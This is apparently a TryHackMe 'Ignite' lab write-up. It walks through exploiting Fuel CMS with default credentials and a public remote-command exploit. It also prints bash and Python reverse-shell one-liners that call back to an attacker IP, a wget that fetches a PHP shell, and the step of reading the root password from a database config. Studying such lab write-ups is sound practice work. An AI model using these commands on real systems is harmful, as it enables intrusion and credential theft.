# TryHackMe - Ignite

[Room link](https://tryhackme.com/room/ignite)

---

## Enumeration

I use nmap for scanning the machine ports and services avalaibles.

First scan :

```bash
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:E2:A6:89:F5:5D (Unknown)
```

---

### HTTP 80

Let's move on the website on port 80. We can wee on the default page the CMS Fuel.

Let's rum a dirb scan :

```bash
$ dirb http://<target_IP>
[...]
==> DIRECTORY: http://10.10.85.16/assets/
+ http://10.10.85.16/home (CODE:200|SIZE:16593)                              
+ http://10.10.85.16/index (CODE:200|SIZE:16593)                             
+ http://10.10.85.16/index.php (CODE:200|SIZE:16593)                         
+ http://10.10.85.16/lost+found (CODE:400|SIZE:1134)                         
+ http://10.10.85.16/offline (CODE:200|SIZE:70)                              
+ http://10.10.85.16/robots.txt (CODE:200|SIZE:30)                           
+ http://10.10.85.16/server-status (CODE:403|SIZE:299)                       
                                                                             
---- Entering directory: http://10.10.85.16/assets/ ----
                                                                              + http://10.10.85.16/assets/@ (CODE:400|SIZE:1134)                           
                                                                              ==> DIRECTORY: http://10.10.85.16/assets/cache/
                                                                              ==> DIRECTORY: http://10.10.85.16/assets/css/                                                      
```

We can see a robots.txt available. If you go to check it in, you will see an another available directory on this website called /fuel/.

Now, we have an authentication form. Let's check the default credentials of the CMS.

The default credentials are : admin/admin. Try to test it.

That works ! We are connect as admin user.



---

## Exploitation

From the administration interface of the CMS, i meet some troubles for change anything.. 

In the same time, I checked if an exploit for Fuel CMS 1.4 exists. I found this follow :

```bash
$ searchsploit fuel cms
[...]
$ searchsploit -m 47138


I just delete the proxy variable and delete the proxy argument in the requests.get.

```bash
#       proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url)
```

Run this exploit with the "id" remote command. 

```bash
$ python 47138.py
[...]
cmd:id
[...]
cmd:id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
[...]
```

We can try to send a command to set up a reverse shell. Don't forget to set a nc listener ( example : $ nc -lnvp 4444).

``̀`bash
cmd:"bash -c 'exec bash -i &>/dev/tcp/<my_ip>/<listener_port> <&1'"
`

That does not works. So let's try to set up a webserver on local and execute a wget command from the target to my machine for get a php reverse shell file.

```bash
# Local (we need to have our reverse shell file on the current directory)
$ python3 -m http.server 80
```

Take this follow commands to get the reverse shell file from target to our webserver.

```bash
cmd:wget http://<your_ip>/<reverse_shell_file>
```

Then, we can execute the file on the browser with this url : http://<target_ip>/<php-reverse-shell>

We can upgrade our reverse shell to a pseudo operationnel TTY :

```bash
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$  
``` 
 
---  
  
## User flag

The user flag is in /home/www-data/flag.txt

---

## Root flag

On the first reverse shell :
  
```bash  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<listner_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```  
  
On the second reverse shell
  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
```
  
There is an interesting things, the user's root password in this file /var/www/html/fuel/application/config/database.php
  
```bash
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '*******',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```
  
Now, we can connect as root user and find the final flag on /root/root.txt
